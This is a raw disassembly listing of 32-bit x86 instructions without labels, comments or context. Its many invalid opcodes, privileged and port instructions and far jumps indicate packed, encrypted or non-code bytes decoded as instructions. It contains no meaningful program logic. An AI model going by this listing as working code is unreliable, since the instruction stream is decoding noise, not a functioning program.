  424348:	push   ss
  424349:	mov    DWORD PTR [esi],0x48cf0181
  42434f:	adc    BYTE PTR [ebp-0x3f],ch
  424352:	scas   eax,DWORD PTR es:[edi]
  424353:	cli    
  424354:	sub    bl,BYTE PTR [eax-0x50692238]
  42435a:	mov    ebp,DWORD PTR [eax+edx*1-0x27]
  42435e:	jnp    0x424312
  424360:	dec    edi
  424361:	nop
  424362:	out    dx,al
  424363:	ret    0xacb
  424366:	lock js 0x4242fd
  424369:	mov    ds:0x223268c2,eax
  42436e:	jmp    0xcab3:0xca40e00e
  424375:	cli    
  424376:	push   ecx
  424377:	mov    edi,0xfa6341ab
  42437c:	aad    0xe4
  42437e:	pop    ecx
  42437f:	sub    eax,0x95198d40
  424384:	and    eax,0x48c5bed2
  424389:	mov    eax,0x4012b9f7
  42438e:	pop    es
  42438f:	daa    
  424390:	js     0x424392
	...
  4243f2:	add    BYTE PTR [eax],al
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243f2
  424401:	push   0x83424931
  424406:	add    DWORD PTR [eax],eax
  424408:	add    eax,0x5c000001
  42440d:	cmp    bl,bh
  42440f:	xor    eax,0x598c90cb
  424414:	imul   esp,DWORD PTR [edx-0x14],0x79
  424418:	call   0xdc216a85
  42441d:	ss loope 0x42445d
  424420:	jecxz  0x4243ea
  424422:	and    esi,DWORD PTR [edi-0x1a]
  424425:	mov    es,WORD PTR [ecx-0x202e663c]
  42442b:	sub    BYTE PTR [edi-0x62d1ddd4],0x89
  424432:	push   ebp
  424433:	and    eax,0x352229b6
  424438:	ins    DWORD PTR es:[edi],dx
  424439:	sub    ecx,DWORD PTR [edx]
  42443b:	pushf  
  42443c:	add    edx,DWORD PTR [ebp-0x69]
  42443f:	or     eax,0xb74a3c96
  424444:	in     al,0xfd
  424446:	mov    edx,0x26443c8b
  42444b:	in     eax,dx
  42444c:	sub    eax,0x8951ce5e
  424451:	repnz push ecx
  424453:	dec    edx
  424454:	repz mov al,ds:0xa76796f8
  42445a:	cmp    eax,0x879ba0a6
  42445f:	xchg   bh,ch
  424461:	cmp    al,al
  424463:	jmp    0x4244a1
  424465:	push   edi
  424466:	sub    eax,0xe7b70af6
  42446b:	pop    ecx
  42446c:	cmc    
  42446d:	adc    ah,BYTE PTR [ebp+0x51]
  424470:	shl    DWORD PTR [ecx],1
  424472:	mov    ds:0x733de767,al
  424477:	xchg   esp,eax
  424478:	and    BYTE PTR [edx-0x466b1486],dh
  42447e:	inc    esi
  42447f:	(bad)  
  424480:	scas   eax,DWORD PTR es:[edi]
  424481:	dec    esi
  424482:	lds    ecx,FWORD PTR [ebx-0x3e]
  424485:	inc    ebx
  424486:	mov    cl,0x5d
  424488:	inc    edi
  424489:	dec    ecx
  42448a:	test   al,0xf7
  42448c:	add    DWORD PTR [ebx+0x75],ebp
  42448f:	test   al,0x94
  424491:	jns    0x4244a1
  424493:	add    edi,DWORD PTR [eax+0x6dcc2332]
  424499:	sub    ebp,DWORD PTR [edx]
  42449b:	(bad)  
  42449c:	cmp    eax,0x9a0456d
  4244a1:	test   DWORD PTR [ebx+esi*4+0x6af9184a],ebx
  4244a8:	dec    edi
  4244a9:	out    0x41,eax
  4244ab:	mul    bl
  4244ad:	retf   0xef8f
  4244b0:	adc    edi,DWORD PTR [ebx+0x4f]
  4244b3:	xchg   ecx,eax
  4244b4:	jmp    0xdbedd64
  4244b9:	or     BYTE PTR [eax+0x1d],cl
  4244bc:	(bad)  
  4244bd:	mov    DWORD PTR [edx+ecx*2-0x30],ecx
  4244c1:	call   0xf0b5:0xbc51b3b0
  4244c8:	cdq    
  4244c9:	mov    dl,0xf6
  4244cb:	and    dl,ah
  4244cd:	pop    eax
  4244ce:	jnp    0x42446c
  4244d0:	repnz popf 
  4244d2:	cli    
  4244d3:	add    eax,0x3475861d
  4244d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244d9:	fnstenv [ecx-0x21]
  4244dc:	pusha  
  4244dd:	sbb    DWORD PTR [ecx-0x52],ecx
  4244e0:	sub    eax,esi
  4244e2:	push   es
  4244e3:	ret    
  4244e4:	icebp  
  4244e5:	test   DWORD PTR [eax-0x17],ebp
  4244e8:	sbb    al,0x3c
  4244ea:	mov    ah,0x66
  4244ec:	mov    bl,dh
  4244ee:	call   0x2249c081
  4244f3:	lock outs dx,DWORD PTR ds:[esi]
  4244f5:	rol    BYTE PTR [eax],0x42
  4244f8:	sti    
  4244f9:	push   esp
  4244fa:	int3   
  4244fb:	bound  esi,QWORD PTR [ebx]
  4244fd:	push   esi
  4244fe:	adc    BYTE PTR [ecx-0x230e7a5a],0x61
  424505:	into   
  424506:	lods   al,BYTE PTR ds:[esi]
  424507:	sub    BYTE PTR [esi+0x5a],ah
  42450a:	push   0x54de1219
  42450f:	mov    ds:0x71,al
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x5b],1
  424581:	inc    ecx
  424582:	sub    al,0xc6
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0xcc000001,al
  42458d:	cmp    ecx,DWORD PTR [edx+0x1b6890e2]
  424593:	clc    
  424594:	arpl   WORD PTR [eax],sp
  424596:	outs   dx,DWORD PTR ds:[esi]
  424597:	sub    BYTE PTR [ebx+0x13],0xe3
  42459b:	jg     0x4245cf
  42459d:	pop    ds
  42459e:	jl     0x424612
  4245a0:	push   ebp
  4245a1:	or     edx,DWORD PTR [ebx-0x1f]
  4245a4:	inc    ecx
  4245a5:	test   DWORD PTR [edi],eax
  4245a7:	shl    BYTE PTR [ecx+0x20],1
  4245aa:	mov    dl,0x46
  4245ac:	pusha  
  4245ad:	cdq    
  4245ae:	pop    edi
  4245af:	lea    edx,[esi]
  4245b1:	rol    BYTE PTR [esi+eiz*2],1
  4245b4:	into   
  4245b5:	(bad)  [esi+0x6cee7dd3]
  4245bb:	jae    0x424599
  4245bd:	sub    bl,BYTE PTR [ebp-0xb]
  4245c0:	xor    bh,BYTE PTR [ecx-0x5a]
  4245c3:	(bad)  
  4245c4:	scas   al,BYTE PTR es:[edi]
  4245c5:	out    0x68,eax
  4245c7:	daa    
  4245c8:	mov    DWORD PTR [edi],ebp
  4245ca:	xchg   ebp,eax
  4245cb:	test   eax,0xb2dc9bc3
  4245d0:	cmp    BYTE PTR [eax-0xd3260dd],dh
  4245d6:	ins    BYTE PTR es:[edi],dx
  4245d7:	aas    
  4245d8:	inc    esp
  4245d9:	adc    cl,BYTE PTR [edi]
  4245db:	ins    BYTE PTR es:[edi],dx
  4245dc:	dec    ecx
  4245dd:	and    ch,BYTE PTR [ebp+0x10208a26]
  4245e3:	icebp  
  4245e4:	adc    eax,0xa57a472a
  4245e9:	cdq    
  4245ea:	outs   dx,BYTE PTR ds:[esi]
  4245eb:	stos   DWORD PTR es:[edi],eax
  4245ec:	xlat   BYTE PTR ds:[ebx]
  4245ed:	inc    edi
  4245ee:	mov    esi,0xebc7c52f
  4245f3:	out    dx,al
  4245f4:	clc    
  4245f5:	pop    edx
  4245f6:	xchg   ecx,eax
  4245f7:	jno    0x424607
  4245f9:	repnz add eax,0x2b6fd5d3
  4245ff:	xchg   BYTE PTR [edx-0x6],dl
  424602:	mov    gs,WORD PTR [ebp+0x635fb9bd]
  424608:	jmp    0x76014bea
  42460d:	xchg   ax,ax
  42460f:	sbb    edx,DWORD PTR [ebx-0x5a81cf41]
  424615:	ror    BYTE PTR [ebp-0x7259945d],1
  42461b:	push   edi
  42461c:	xor    DWORD PTR [eax],ebp
  42461e:	test   BYTE PTR [ebx],al
  424620:	xchg   ebp,eax
  424621:	sbb    esi,DWORD PTR [edx-0x482eb3a5]
  424627:	mov    al,0x37
  424629:	adc    BYTE PTR fs:[ebp+0x38],0x42
  42462e:	mov    edi,0x9869d82f
  424633:	and    dl,BYTE PTR [eax-0x578abcef]
  424639:	ins    BYTE PTR es:[edi],dx
  42463a:	mov    ecx,0xc587e068
  42463f:	test   eax,0x4aa54fa7
  424644:	outs   dx,BYTE PTR ds:[esi]
  424645:	pop    edi
  424646:	xchg   BYTE PTR [eax+ebp*4],cl
  424649:	xor    esi,eax
  42464b:	push   edi
  42464c:	mov    ds,ecx
  42464e:	sub    DWORD PTR [ebx-0x4a],0x2e
  424652:	xor    DWORD PTR [edx],esp
  424654:	pop    edi
  424655:	sub    dl,BYTE PTR [esi-0x731f05e9]
  42465b:	jo     0x424681
  42465d:	xor    DWORD PTR ds:0xd0c3a011,ecx
  424663:	clc    
  424664:	sub    al,0x54
  424666:	inc    ecx
  424667:	loopne 0x42465a
  424669:	outs   dx,BYTE PTR ds:[esi]
  42466a:	mov    ecx,0xed3a3704
  42466f:	or     edi,DWORD PTR [ecx+0x7d]
  424672:	and    DWORD PTR [eax+0x6828f6bc],ebx
  424678:	lods   eax,DWORD PTR ds:[esi]
  424679:	cmc    
  42467a:	inc    edi
  42467b:	and    al,0xf2
  42467d:	xor    ecx,0xdfc02ce7
  424683:	fst    QWORD PTR [ecx+0x11c29c41]
  424689:	mov    ch,0xd2
  42468b:	mov    dh,0xa8
  42468d:	in     eax,dx
  42468e:	adc    edi,DWORD PTR [ebp+0x72]
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edx+edx*2],ch
  424702:	imul   esi,DWORD PTR [ecx+0x4c],0xffffff85
  424706:	add    DWORD PTR [eax],eax
  424708:	add    eax,0xa2000001
  42470d:	or     ch,BYTE PTR [eax+ebx*2]
  424710:	adc    BYTE PTR [esi-0xb],0x9
  424714:	jp     0x424763
  424716:	gs jge 0x424747
  424719:	add    DWORD PTR [edi+0x352c9d26],ecx
  42471f:	pop    ecx
  424720:	(bad)  
  424721:	jnp    0x42477b
  424723:	or     eax,DWORD PTR [ecx+0x1b]
  424726:	jecxz  0x42478e
  424728:	les    edx,FWORD PTR [ebp+esi*4-0x3a]
  42472c:	int3   
  42472d:	xor    al,0x2a
  42472f:	out    dx,al
  424730:	int3   
  424731:	mov    esi,0x45050092
  424736:	dec    eax
  424737:	push   eax
  424738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424739:	lock sbb eax,0xb4b0cc6a
  42473f:	mov    esp,0xd3beb6cb
  424744:	(bad)  
  424745:	jg     0x424777
  424747:	push   ss
  424748:	popa   
  424749:	in     al,dx
  42474a:	es adc eax,0xb8147c44
  424750:	lea    ecx,ds:0x6d2d689
  424756:	pop    ecx
  424757:	lea    eax,[edx]
  424759:	push   ebp
  42475a:	fdiv   DWORD PTR [edi+0x36145e16]
  424760:	xor    bh,BYTE PTR [edi+edi*4]
  424763:	jo     0x424791
  424765:	add    DWORD PTR [edi],0xfffffff8
  424768:	push   ebp
  424769:	ins    DWORD PTR es:[edi],dx
  42476a:	popa   
  42476b:	pop    ds
  42476c:	or     DWORD PTR [ebp+0x58c37835],eax
  424772:	jb     0x42478f
  424774:	test   DWORD PTR [eax],esi
  424776:	mov    esp,0x40065e7d
  42477b:	push   edi
  42477c:	mov    gs,ecx
  42477e:	add    BYTE PTR [edx],bh
  424780:	stc    
  424781:	gs call 0xc89c:0x67741e56
  424789:	addr16 in al,dx
  42478b:	in     eax,0x32
  42478d:	out    0x57,al
  42478f:	jmp    0xa590:0x407c83be
  424796:	ret    
  424797:	jmp    0x4247df
  424799:	shr    DWORD PTR [eax-0x45],cl
  42479c:	jmp    0x8d4fcb7b
  4247a1:	or     DWORD PTR [edi],0xda462ca0
  4247a7:	and    ah,BYTE PTR [ebx-0x55610671]
  4247ad:	test   DWORD PTR [ebx+0x4800f08e],ecx
  4247b3:	push   cs
  4247b4:	dec    ebp
  4247b5:	je     0x424761
  4247b7:	or     ebp,DWORD PTR [esp+ebx*4]
  4247ba:	and    dh,ch
  4247bc:	xchg   ebx,eax
  4247bd:	iret   
  4247be:	les    ebp,FWORD PTR [esi-0xb]
  4247c1:	shr    BYTE PTR ds:0x9987ffe5,1
  4247c7:	inc    esp
  4247c8:	adc    DWORD PTR [ebx],0x1c
  4247cb:	icebp  
  4247cc:	jmp    0x5dba87f4
  4247d1:	out    0x76,eax
  4247d3:	lahf   
  4247d4:	add    edx,DWORD PTR cs:[esi]
  4247d7:	sub    DWORD PTR ds:0xaefdbdbc,eax
  4247dd:	jo     0x4247eb
  4247df:	fs stc 
  4247e1:	loopne 0x424794
  4247e3:	pop    ebx
  4247e4:	or     BYTE PTR [edi+ecx*4],dh
  4247e7:	xchg   edi,eax
  4247e8:	add    bl,BYTE PTR [edx]
  4247ea:	mov    ecx,0x127505ac
  4247ef:	sti    
  4247f0:	jmp    0xc74438c2
  4247f5:	scas   al,BYTE PTR es:[edi]
  4247f6:	pusha  
  4247f7:	or     BYTE PTR [ebx],ah
  4247f9:	adc    al,0x9a
  4247fb:	push   0xc3e52dc3
  424800:	lods   eax,DWORD PTR ds:[esi]
  424801:	mov    cl,0xcd
  424803:	std    
  424804:	mov    ebx,0xc25ba4ef
  424809:	and    BYTE PTR [ecx+0x1c],bl
  42480c:	lea    eax,[edx-0x37]
  42480f:	dec    edi
  424810:	loop   0x424812
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	push   eax
  424881:	icebp  
  424882:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424884:	push   ecx
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0x4e000001,al
  42488d:	(bad)  
  42488e:	stc    
  42488f:	pop    esp
  424890:	cmp    dl,BYTE PTR [ebp+edi*1+0x6e]
  424894:	add    eax,0x83f4b85f
  424899:	cld    
  42489a:	pop    ebp
  42489b:	jge    0x42484d
  42489d:	mov    ds:0xfea298a,al
  4248a2:	mov    ecx,ss
  4248a4:	jae    0x4248e5
  4248a6:	cmp    ch,BYTE PTR [ecx+0x28]
  4248a9:	leave  
  4248aa:	cdq    
  4248ab:	dec    eax
  4248ac:	mov    ebx,0x3c1f18f3
  4248b1:	inc    ebx
  4248b2:	sub    eax,0x14b08c6
  4248b7:	(bad)  
  4248b8:	aam    0x45
  4248ba:	out    0x76,eax
  4248bc:	inc    DWORD PTR [edx-0x32aad0f6]
  4248c2:	xor    al,0x1b
  4248c4:	mov    ch,BYTE PTR ds:0xe0553e41
  4248ca:	mov    eax,0xdeb517c5
  4248cf:	fidiv  WORD PTR [eax+0x59]
  4248d2:	jb     0x42487f
  4248d4:	or     DWORD PTR [ecx+0x3d],0xffffffa4
  4248d8:	dec    edx
  4248d9:	jns    0x42492c
  4248db:	or     ecx,DWORD PTR [eax+0x54]
  4248de:	mov    edx,ebp
  4248e0:	inc    edx
  4248e1:	inc    esp
  4248e2:	xchg   ebp,eax
  4248e3:	out    0xd7,al
  4248e5:	sbb    bl,BYTE PTR [ebp-0x7d]
  4248e8:	sub    DWORD PTR [eax+ebp*2+0x59],eax
  4248ec:	enter  0x7051,0x54
  4248f0:	aaa    
  4248f1:	test   edx,edi
  4248f3:	sbb    esp,DWORD PTR [eax+0x786a19d5]
  4248f9:	mov    edi,0x87420310
  4248fe:	mov    esp,0x5a18d336
  424903:	(bad)  
  424905:	mov    edi,0x46d48dad
  42490a:	jae    0x424924
  42490c:	sar    DWORD PTR [edi-0x2ab9615b],1
  424912:	les    ebp,FWORD PTR [edi+0x28ba0aa1]
  424918:	xchg   ebp,eax
  424919:	mov    ch,0x63
  42491b:	or     esi,eax
  42491d:	mov    al,bl
  42491f:	lds    ebp,FWORD PTR [esi+0x2c]
  424922:	inc    edx
  424923:	shr    al,cl
  424925:	(bad)  
  424926:	out    dx,al
  424927:	mov    ch,0x31
  424929:	mov    edx,0x4e7c49af
  42492e:	daa    
  42492f:	push   ecx
  424930:	pop    edx
  424931:	pop    ebp
  424932:	scas   eax,DWORD PTR es:[edi]
  424933:	push   eax
  424934:	call   0x4751907c
  424939:	stos   DWORD PTR es:[edi],eax
  42493a:	xchg   DWORD PTR [ebp+0xe],ecx
  42493d:	push   ebx
  42493e:	push   esi
  42493f:	sahf   
  424940:	popa   
  424941:	(bad)  
  424942:	jbe    0x42499f
  424944:	jg     0x4248f3
  424946:	inc    eax
  424947:	stos   BYTE PTR es:[edi],al
  424948:	xchg   DWORD PTR [edx-0x60ba24ac],edi
  42494e:	fucomip st,st(4)
  424950:	adc    al,0xb7
  424952:	gs mov ebp,0x7fa75a22
  424958:	fist   DWORD PTR [edi-0x5230e8aa]
  42495e:	and    DWORD PTR [ebx],edi
  424960:	les    edx,FWORD PTR [ebx]
  424962:	adc    dh,dh
  424964:	jb     0x424953
  424966:	jecxz  0x4249ae
  424968:	out    0x7d,al
  42496a:	pop    edi
  42496b:	mov    ecx,0x2be0e8fd
  424970:	push   cs
  424971:	call   0xcab7:0x8bf703a0
  424978:	xor    eax,DWORD PTR [ebx]
  42497a:	fisttp WORD PTR [esi+0x2176bb1a]
  424980:	or     cl,BYTE PTR [edx+0x4d961a3a]
  424986:	sbb    al,0xbc
  424988:	pop    ss
  424989:	mov    bl,0xdd
  42498b:	or     BYTE PTR [edi-0x3efbbdab],0x0
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dl,BYTE PTR [eax+0x56afd500]
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x8000001,al
  424a0d:	shl    DWORD PTR [eax],cl
  424a0f:	test   eax,0xe0ae1f88
  424a14:	stos   DWORD PTR es:[edi],eax
  424a15:	fldenv [edi]
  424a17:	dec    ebp
  424a18:	cmp    BYTE PTR [ebx],ch
  424a1a:	dec    esp
  424a1b:	push   edi
  424a1c:	out    0x59,al
  424a1e:	ror    BYTE PTR [esi],cl
  424a20:	inc    ecx
  424a21:	(bad)  
  424a22:	(bad)  
  424a23:	jne    0x424a95
  424a25:	and    DWORD PTR [ecx+0x46],ecx
  424a28:	mov    esi,0x9b3e3583
  424a2d:	sbb    ebx,ebx
  424a2f:	in     al,0x49
  424a31:	loopne 0x4249e0
  424a33:	sub    dh,ah
  424a35:	in     al,0x6f
  424a37:	jnp    0x424a00
  424a39:	mov    cs:0xe8b353bd,eax
  424a3f:	addr16 jae 0x4249c8
  424a42:	mov    ds:0xf820681,al
  424a47:	and    al,0x9e
  424a49:	inc    edi
  424a4a:	(bad)  
  424a4b:	sahf   
  424a4c:	test   DWORD PTR [edx+0x52608719],0x74abb2d0
  424a56:	fcmovnbe st,st(6)
  424a58:	xor    al,0x1d
  424a5a:	mov    cl,0x5c
  424a5c:	test   BYTE PTR [edi-0x54],ah
  424a5f:	rol    DWORD PTR [ebp-0x2a],0xcd
  424a63:	aas    
  424a64:	test   al,0xfd
  424a66:	retf   
  424a67:	sub    edx,DWORD PTR [esi]
  424a69:	cmp    esp,DWORD PTR [edi-0x370c000]
  424a6f:	sbb    eax,esp
  424a71:	(bad)  
  424a72:	aas    
  424a73:	or     ebp,ebp
  424a75:	cmp    DWORD PTR [edx-0x7],ecx
  424a78:	icebp  
  424a79:	mul    DWORD PTR [esp+ecx*4-0x38953539]
  424a80:	cmc    
  424a81:	sbb    eax,0x4b7e0ca1
  424a86:	icebp  
  424a87:	mov    al,ds:0x4e07fcb8
  424a8c:	inc    DWORD PTR [edi+esi*4+0x6d40a819]
  424a93:	fidivr WORD PTR [edx-0x1ac6cd9e]
  424a99:	pop    eax
  424a9a:	mov    eax,ds:0xc490f021
  424a9f:	imul   ecx,DWORD PTR [ebx],0x42
  424aa2:	outs   dx,BYTE PTR ds:[esi]
  424aa3:	loop   0x424ab6
  424aa5:	int    0xd2
  424aa7:	pop    esi
  424aa8:	or     edi,DWORD PTR [eax+edx*1+0x2dfd0f2]
  424aaf:	or     al,0x2d
  424ab1:	dec    edi
  424ab2:	jae    0x424a4b
  424ab4:	scas   al,BYTE PTR es:[edi]
  424ab5:	mov    ebp,0xe84e7956
  424aba:	xor    BYTE PTR [edx+0x6],al
  424abd:	add    ecx,edi
  424abf:	jecxz  0x424a93
  424ac1:	pop    esp
  424ac2:	(bad)  
  424ac3:	sbb    al,0x74
  424ac5:	and    BYTE PTR [ebp-0x39],bh
  424ac8:	jb     0x424b1c
  424aca:	pop    esi
  424acb:	mov    ecx,0x440a566
  424ad0:	pop    ecx
  424ad1:	mov    eax,ds:0x8b4d2b4b
  424ad6:	pop    eax
  424ad7:	loope  0x424a77
  424ad9:	cmp    DWORD PTR [edi-0xe],ebp
  424adc:	adc    BYTE PTR [eax+0x10a603de],0x3a
  424ae3:	pop    eax
  424ae4:	or     al,0xa7
  424ae6:	pop    ss
  424ae7:	pop    ebx
  424ae8:	(bad)  
  424ae9:	aas    
  424aea:	sub    eax,0x1819d786
  424aef:	inc    eax
  424af0:	int3   
  424af1:	push   0x13
  424af3:	lock call 0xd7a0:0x4f314ac9
  424afb:	test   BYTE PTR [esi+0x4e],dl
  424afe:	scas   al,BYTE PTR es:[edi]
  424aff:	rcr    DWORD PTR [edx+0x452f9b11],0x71
  424b06:	lock push cs
  424b08:	xor    BYTE PTR [esp+ebx*1-0x255da303],cl
  424b0f:	mov    bl,0xc
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	fwait
  424b81:	daa    
  424b82:	int    0xf8
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x8a000001,al
  424b8d:	push   esi
  424b8e:	jmp    0x424b1a
  424b90:	inc    eax
  424b91:	test   cl,dh
  424b93:	jmp    0xc651165
  424b98:	mov    dl,0xed
  424b9a:	sbb    bl,BYTE PTR [ecx+edi*4-0x7c]
  424b9e:	adc    esp,0x56
  424ba1:	push   ebp
  424ba2:	push   ebx
  424ba3:	fist   DWORD PTR [ebx+ebp*8-0x48]
  424ba7:	aam    0x63
  424ba9:	lea    esi,[ecx-0x20112688]
  424baf:	cmp    al,0xb8
  424bb1:	outs   dx,DWORD PTR ds:[esi]
  424bb2:	test   BYTE PTR [edx+0x52],0xd8
  424bb6:	push   edi
  424bb7:	ins    BYTE PTR es:[edi],dx
  424bb8:	and    ecx,ebp
  424bba:	xor    BYTE PTR [ebx+0x5a3011a9],al
  424bc0:	bound  esi,QWORD PTR [edx-0x57]
  424bc3:	add    al,0x4e
  424bc5:	mov    bl,0x29
  424bc7:	pop    ecx
  424bc8:	mov    al,0xc2
  424bca:	sub    BYTE PTR gs:[edx+0xa],dl
  424bce:	ja     0x424bb0
  424bd0:	cmp    edx,edx
  424bd2:	or     DWORD PTR [esi],esi
  424bd4:	int    0xf2
  424bd6:	jmp    0x1c86c992
  424bdb:	pop    ds
  424bdc:	retf   
  424bdd:	not    BYTE PTR [ebx]
  424bdf:	es jecxz 0x424b66
  424be2:	in     eax,dx
  424be3:	cmp    eax,0xda1caede
  424be8:	stos   BYTE PTR es:[edi],al
  424be9:	int3   
  424bea:	add    eax,edx
  424bec:	mov    ebp,0x7d143157
  424bf1:	pop    ss
  424bf2:	mov    ch,0x90
  424bf4:	lea    edx,[edi]
  424bf6:	int3   
  424bf7:	xor    DWORD PTR [ebx+0x407fbcb3],esi
  424bfd:	and    esp,DWORD PTR [edi-0x3c066910]
  424c03:	test   BYTE PTR [edx+0x40],dl
  424c06:	sub    BYTE PTR [edi+0x59],dh
  424c09:	iret   
  424c0a:	(bad)  
  424c0c:	js     0x424c28
  424c0e:	pop    edi
  424c0f:	clc    
  424c10:	mov    ds:0x8e235fab,eax
  424c15:	ret    
  424c16:	xlat   BYTE PTR ds:[ebx]
  424c17:	stos   BYTE PTR es:[edi],al
  424c18:	xor    BYTE PTR ds:0x8662a87d,bl
  424c1e:	mov    al,0x18
  424c20:	mov    DWORD PTR [esi-0x50],0x3c8a5fd1
  424c27:	outs   dx,DWORD PTR ds:[esi]
  424c28:	or     al,0xd1
  424c2a:	js     0x424bf1
  424c2c:	inc    esp
  424c2d:	leave  
  424c2e:	cmp    DWORD PTR [ecx],0x9345832f
  424c34:	push   esi
  424c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c36:	cmp    ebx,DWORD PTR [ebp-0x1beb1d92]
  424c3c:	xchg   esp,eax
  424c3d:	mov    ebp,0xa1f7c5f7
  424c42:	mov    eax,ds:0xecdc5576
  424c47:	xor    cl,BYTE PTR [edx+esi*2-0x6262193c]
  424c4e:	cmp    BYTE PTR [edi-0x11],dl
  424c51:	sub    esp,DWORD PTR [ebx]
  424c53:	sub    edx,DWORD PTR [edi+0x66]
  424c56:	sti    
  424c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c58:	je     0x424bf8
  424c5a:	mov    esi,0x22b56c4d
  424c5f:	jge    0x424c54
  424c61:	sbb    al,0x5f
  424c63:	test   eax,0xb46e4bb8
  424c68:	imul   DWORD PTR [edi]
  424c6a:	out    dx,al
  424c6b:	push   ebx
  424c6c:	xchg   edx,eax
  424c6d:	adc    al,0x37
  424c6f:	lods   al,BYTE PTR ds:[esi]
  424c70:	sar    DWORD PTR [esi+ebx*8-0x56c00d32],cl
  424c77:	in     al,0xd2
  424c79:	sbb    BYTE PTR [ebp-0x7e3e9af6],dl
  424c7f:	fld    DWORD PTR [edx]
  424c81:	daa    
  424c82:	push   eax
  424c83:	lods   al,BYTE PTR ds:[esi]
  424c84:	adc    edi,DWORD PTR [edx]
  424c86:	fsubr  st,st(1)
  424c88:	pop    eax
  424c89:	sbb    eax,0xcbb31209
  424c8e:	retf   
  424c8f:	idiv   DWORD PTR [esi+0x0]
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x4a9ae58]
  424d02:	pop    esp
  424d03:	xchg   edx,eax
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0xf2000001,al
  424d0d:	ins    DWORD PTR es:[edi],dx
  424d0e:	fnstsw WORD PTR [edx+ecx*8+0x5b]
  424d12:	hlt    
  424d13:	add    al,0x17
  424d15:	test   DWORD PTR es:[ecx],ebp
  424d18:	pop    eax
  424d19:	jns    0x424d99
  424d1b:	pop    es
  424d1c:	xchg   ebp,eax
  424d1d:	lods   al,BYTE PTR ds:[esi]
  424d1e:	push   ecx
  424d1f:	loopne 0x424cfb
  424d21:	jb     0x424d8e
  424d23:	das    
  424d24:	pop    es
  424d25:	enter  0xccd4,0xc8
  424d29:	dec    eax
  424d2a:	stos   BYTE PTR es:[edi],al
  424d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d2c:	fwait
  424d2d:	pop    edi
  424d2e:	mov    DWORD PTR [ecx-0x59],ecx
  424d31:	iret   
  424d32:	scas   eax,DWORD PTR es:[edi]
  424d33:	mov    bl,0xa8
  424d35:	mov    esp,0x9192abf3
  424d3a:	mov    eax,ds:0x6345668e
  424d3f:	retf   
  424d40:	mov    eax,ds:0x524f6d89
  424d45:	push   cs
  424d46:	fisubr DWORD PTR [eax-0x3eb62683]
  424d4c:	mov    eax,0xc706ed94
  424d51:	and    bh,ah
  424d53:	jg     0x424cf5
  424d55:	mov    ss,WORD PTR [ecx-0x50]
  424d58:	lods   al,BYTE PTR ds:[esi]
  424d59:	add    ecx,esi
  424d5b:	lahf   
  424d5c:	test   al,0x1c
  424d5e:	cmp    ch,BYTE PTR [edi+0x31c6e2ac]
  424d64:	ror    ah,1
  424d66:	mov    eax,0x3e403ac2
  424d6b:	daa    
  424d6c:	stos   BYTE PTR es:[edi],al
  424d6d:	(bad)  
  424d6e:	fmul   QWORD PTR [eax-0x3a]
  424d71:	loope  0x424d77
  424d73:	call   0xeb429010
  424d78:	iret   
  424d79:	jg     0x424d30
  424d7b:	sub    edx,DWORD PTR [edi+0x4b]
  424d7e:	dec    ecx
  424d7f:	xchg   esp,eax
  424d80:	xchg   esi,eax
  424d81:	js     0x424d86
  424d83:	jmp    FWORD PTR [ecx+eax*4-0x6c826eff]
  424d8a:	mov    edi,0x8e7b1f49
  424d8f:	idiv   DWORD PTR [edx]
  424d91:	ror    BYTE PTR [ecx],cl
  424d93:	mov    ch,0xc4
  424d95:	jge    0x424d96
  424d97:	xchg   edi,eax
  424d98:	jo     0x424d9a
  424d9a:	mov    esp,0x3eae36c4
  424d9f:	sahf   
  424da0:	adc    BYTE PTR [edi],dh
  424da2:	mov    dh,0x30
  424da4:	aad    0xf7
  424da6:	push   esi
  424da7:	je     0x424df2
  424da9:	repnz iret 
  424dab:	retf   
  424dac:	test   al,0x66
  424dae:	mov    ebp,0xe726ec41
  424db3:	mov    dh,0x25
  424db5:	jl     0x424d42
  424db7:	test   al,0x94
  424db9:	and    edx,DWORD PTR [ecx]
  424dbb:	fcom   QWORD PTR [edx]
  424dbd:	shl    BYTE PTR [edx+ecx*8+0x21],0x57
  424dc2:	in     al,0x2a
